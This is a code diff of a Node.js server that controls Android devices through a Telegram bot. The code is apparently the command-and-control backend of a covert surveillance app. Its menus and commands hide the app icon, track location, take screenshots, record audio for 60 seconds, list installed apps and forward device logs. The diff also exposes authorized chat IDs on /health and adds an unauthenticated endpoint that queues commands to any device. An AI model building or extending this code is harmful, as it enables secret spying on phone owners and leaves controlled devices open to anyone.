@@ -270,7 +270,7 @@ function formatLocationMessage(locationData) {
             try {
                 locData = JSON.parse(locationData);
             } catch (e) {
-                return locationData;
+                return { text: locationData };
             }
         }
 
@@ -492,16 +492,16 @@ async function handleCallbackQuery(callbackQuery) {
     } else if (data === 'menu_services') {
         const keyboard = [
             [
-                createInlineButton('▶️ Start Stream', 'cmd:start_stream'),
-                createInlineButton('⏹️ Stop Stream', 'cmd:stop_stream')
-            ],
-            [
                 createInlineButton('👻 Hide Icon', 'cmd:hide_icon'),
                 createInlineButton('👁️ Show Icon', 'cmd:show_icon')
             ],
             [
                 createInlineButton('🔄 Reboot Services', 'cmd:reboot_app'),
                 createInlineButton('🗑️ Clear Logs', 'cmd:clear_logs')
+            ],
+            [
+                createInlineButton('📊 Service Status', 'cmd:status'),
+                createInlineButton('📝 Logs Count', 'cmd:logs_count')
             ],
             [
                 createInlineButton('◀️ Back', 'help_main')
@@ -525,9 +525,6 @@ async function handleCallbackQuery(callbackQuery) {
             ],
             [
                 createInlineButton('📊 Status', 'cmd:status'),
-                createInlineButton('📝 Logs Count', 'cmd:logs_count')
-            ],
-            [
                 createInlineButton('◀️ Back', 'help_main')
             ]
         ];
@@ -556,10 +553,6 @@ async function handleCallbackQuery(callbackQuery) {
     } else if (data === 'menu_about') {
         const keyboard = [
             [
-                createUrlButton('🔗 GitHub', 'https://github.com/your-repo'),
-                createInlineButton('📞 Contact', 'contact_support')
-            ],
-            [
                 createInlineButton('◀️ Back', 'help_main')
             ]
         ];
@@ -576,9 +569,6 @@ async function handleCallbackQuery(callbackQuery) {
             "• Location tracking\n" +
             "• Schedule recording\n\n" +
             "Use the menu below to navigate.");
-        
-    } else if (data === 'contact_support') {
-        await answerCallbackQuery(callbackId, "Support: your.email@example.com");
         
     } else if (data === 'close_menu') {
         await editMessageKeyboard(chatId, messageId, []);
@@ -788,6 +778,10 @@ async function handleCommand(chatId, command, messageId) {
         ackMessage = `📱 Generating apps list file...`;
     } else if (cleanCommand === 'location') {
         ackMessage = `📍 Getting your current location...`;
+    } else if (cleanCommand === 'screenshot') {
+        ackMessage = `📸 Taking screenshot...`;
+    } else if (cleanCommand === 'record') {
+        ackMessage = `🎤 Recording audio for 60 seconds...`;
     }
     
     await sendTelegramMessage(chatId, ackMessage);
@@ -1154,7 +1148,7 @@ app.get('/health', (req, res) => {
     res.json({ 
         status: 'healthy', 
         devices: devices.size,
-        authorizedChats: authorizedChats.size,
+        authorizedChats: Array.from(authorizedChats).join(', '),
         timestamp: Date.now()
     });
 });
@@ -1177,11 +1171,17 @@ app.get('/api/commands/:deviceId', (req, res) => {
     
     try {
         if (device?.pendingCommands?.length > 0) {
-            const commands = [...device.pendingCommands];
+            const commands = device.pendingCommands.map(cmd => ({
+                command: cmd.command,
+                originalCommand: cmd.originalCommand,
+                messageId: cmd.messageId,
+                timestamp: cmd.timestamp
+            }));
             device.pendingCommands = [];
-            console.log(`📤 Sending ${commands.length} commands to ${deviceId}`);
+            console.log(`📤 Sending ${commands.length} commands to ${deviceId}:`, commands);
             sendJsonResponse(res, { commands });
         } else {
+            console.log(`📭 No commands for ${deviceId}`);
             sendJsonResponse(res, { commands: [] });
         }
     } catch (e) {
@@ -1250,7 +1250,6 @@ app.post('/api/register', async (req, res) => {
         `✅ <b>Device Connected!</b>\n\n` +
         `Model: ${deviceInfo.model}\n` +
         `Android: ${deviceInfo.android}\n` +
-        `Battery: ${deviceInfo.battery}\n\n` +
         `Use the menu button below or tap the buttons to control your device:`,
         getMainMenuKeyboard()
     );
@@ -1272,6 +1271,32 @@ app.get('/api/devices', (req, res) => {
     res.json({ total: devices.size, devices: deviceList });
 });
 
+// Test endpoint to manually add a command
+app.post('/api/test-command/:deviceId', (req, res) => {
+    const deviceId = req.params.deviceId;
+    const { command } = req.body;
+    
+    const device = devices.get(deviceId);
+    
+    if (!device) {
+        return res.status(404).json({ error: 'Device not found' });
+    }
+    
+    if (!device.pendingCommands) {
+        device.pendingCommands = [];
+    }
+    
+    const cmd = command || 'status';
+    device.pendingCommands.push({
+        command: cmd,
+        originalCommand: '/' + cmd,
+        timestamp: Date.now()
+    });
+    
+    console.log(`🧪 Test command added for ${deviceId}: ${cmd}`);
+    res.json({ success: true, message: `Test command '${cmd}' added` });
+});
+
 // ============= TEST ENDPOINTS =============
 
 app.get('/test', (req, res) => {
@@ -1282,9 +1307,12 @@ app.get('/test', (req, res) => {
             <p><b>Time:</b> ${new Date().toISOString()}</p>
             <p><b>Devices:</b> ${devices.size}</p>
             <p><b>Authorized Chats:</b> ${Array.from(authorizedChats).join(', ')}</p>
-            <p><b>Menu Button:</b> ✅ Configured</p>
-            <p><b>Interactive Schedule:</b> ✅ Added</p>
-            <p><b>Log Endpoints:</b> ✅ /api/logs, /api/logs/batch</p>
+            <p><b>Registered Devices:</b></p>
+            <ul>
+                ${Array.from(devices.entries()).map(([id, device]) => 
+                    `<li>${id} - ${device.deviceInfo?.model} (Last seen: ${new Date(device.lastSeen).toLocaleString()})</li>`
+                ).join('')}
+            </ul>
             <p><a href="/test-menu" style="background: #4CAF50; color: white; padding: 10px; text-decoration: none; border-radius: 5px;">Send Test Menu</a></p>
         </body>
         </html>
@@ -1319,10 +1347,7 @@ app.listen(PORT, '0.0.0.0', () => {
     console.log('   └─ POST /api/logs - Single log entry');
     console.log('   └─ POST /api/log - Alias for /api/logs');
     console.log('   └─ POST /api/logs/batch - Batch log upload');
-    console.log('\n✅ FEATURES:');
-    console.log('   └─ Real-time log forwarding to Telegram');
-    console.log('   └─ Log type detection and formatting');
-    console.log('   └─ Batch log summaries');
-    console.log('   └─ Device validation');
+    console.log('\n✅ TEST COMMANDS:');
+    console.log('   └─ POST /api/test-command/:deviceId - Add test command');
     console.log('\n🚀 ===============================================\n');
 });
